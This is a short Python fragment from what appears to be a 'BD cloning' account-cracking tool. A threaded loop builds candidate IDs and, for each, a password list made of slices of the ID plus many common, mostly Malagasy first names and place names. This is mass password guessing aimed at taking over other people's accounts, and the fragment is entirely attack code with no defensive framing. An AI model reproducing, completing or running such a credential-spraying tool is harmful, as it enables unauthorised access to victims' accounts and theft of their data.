...
def BD_CLONING():
    ...
    with tred(max_workers=40) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Tsilavina','tsilavina','Sarindra','lantoniaina','Lantoniaina','sarindra','nilaina','Nilaina','larissa','Larissa','safelika','Safelika','sosisy','Sosisy','kitoza','Kitoza','Jirama','jirama','antsirabe','Antsirabe','tsilavina','Nomena','nambinina','Nambinina','sylvain','Sylvain','Sitraka','sitraka','nantenaina','mamitiana','Mamitiana','ravaka','Ravaka','vololona','Vololona','mamasosy','Mamasosy','mamisoa','Mamisoa','sipako','fanomezantsoa','Fanomezantsoa','Sipako','fanantenana','Fanantenana','narindra','Narindra','nathalie','Nathalie','free fire','Lalatiana','lalatiana','samuel','Samuel','mirado','Mirado','mioty','Mioty','sarobidy','Sarobidy','Nantenaina','rakoto','Rakoto','nilaina','Nilaina','marinah','Marinah','lalaina','Lalaina', 'mendrika', 'mendrika', 'safidy', 'Nantenaina','mahery','Mahery','diamondra','Diamondra','nirina','Nirina','jessica','Jessica','mandresy','Mandresy','fandresena','Fandresena','lelena','Lelena']
